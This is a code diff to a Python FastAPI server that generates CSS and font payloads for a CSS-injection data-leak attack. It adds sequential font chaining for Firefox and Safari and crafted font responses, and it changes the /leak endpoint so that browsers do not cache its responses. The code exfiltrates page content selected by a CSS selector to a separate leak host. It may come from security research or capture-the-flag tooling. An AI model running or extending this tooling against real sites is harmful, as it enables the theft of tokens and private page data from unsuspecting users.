@@ -92,31 +92,64 @@ async def index(request: Request, params: DynamicLeakSetupParams = Depends()):
 
     state = leak_states[params.id]
 
-    if params.staging and state.browser == "chrome":
-        template = templates.get_template("dynamic-staging.css.jinja")
-        css = dynamic_css.generate_staging(
+    if state.browser == "chrome":
+        if params.staging:
+            template = templates.get_template("dynamic-staging.css.jinja")
+            css = dynamic_css.generate_staging(
+                id=state.id,
+                step=state.step,
+                host=settings.host,
+                template=template,
+                browser=state.browser,
+            )
+            return Response(content=css, media_type="text/css")
+
+        template = templates.get_template("dynamic.css.jinja")
+        css = dynamic_css.generate(
             id=state.id,
             step=state.step,
-            host=settings.host,
+            step_map=state.step_map,
             template=template,
+            alphabet_size=len(params.alphabet),
+            font_path=state.font_path,
+            host=settings.host,
+            host_leak=settings.host_leak,
+            leak_selector=params.selector,
             browser=state.browser,
         )
         return Response(content=css, media_type="text/css")
 
-    template = templates.get_template("dynamic.css.jinja")
-    css = dynamic_css.generate(
-        id=state.id,
-        step=state.step,
-        step_map=state.step_map,
-        template=template,
-        alphabet_size=len(params.alphabet),
-        font_path=state.font_path,
-        host=settings.host,
-        host_leak=settings.host_leak,
-        leak_selector=params.selector,
-        browser=state.browser,
+    if params.step is None:
+        # sequential font chaining for Firefox and Safari
+        template = templates.get_template("dynamic-sfc.css.jinja")
+        css = dynamic_css.generate_sfc(
+            id=state.id,
+            idx_max=128,
+            step=state.step,
+            template=template,
+            alphabet_size=len(params.alphabet),
+            host=settings.host,
+            host_leak=settings.host_leak,
+            leak_selector=params.selector,
+            browser=state.browser,
+        )
+        return Response(content=css, media_type="text/css")
+
+    font_path, _ = dynamic_font.generate(
+        DynamicLeakSetupParams.model_fields["alphabet"].default,
+        idx_max=10,
+        strip=True,
+        prefix="window" + state.reconstruction,
+        prefix_idx=True,
     )
-    return Response(content=css, media_type="text/css")
+    import base64
+
+    font_data = base64.b64decode(font_path.split("data:font/opentype;base64,")[-1])
+    return Response(
+        content=font_data,
+        media_type="font/opentype",
+        headers={"Access-Control-Allow-Origin": "*"},
+    )
 
 
 @app.get("/static")
@@ -148,7 +181,16 @@ def leak(request: Request, params: DynamicLeakParams = Depends()):
                 leak_events[params.id].clear()
 
     with open("templates/empty.png", "rb") as f:
-        return Response(content=f.read(), media_type="image/png")
+        return Response(
+            content="",
+            media_type="image/png",
+            status_code=400,
+            headers={
+                "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
+                "Pragma": "no-cache",
+                "Expires": "0",
+            },
+        )
 
 
 @app.get("/font.ttf")
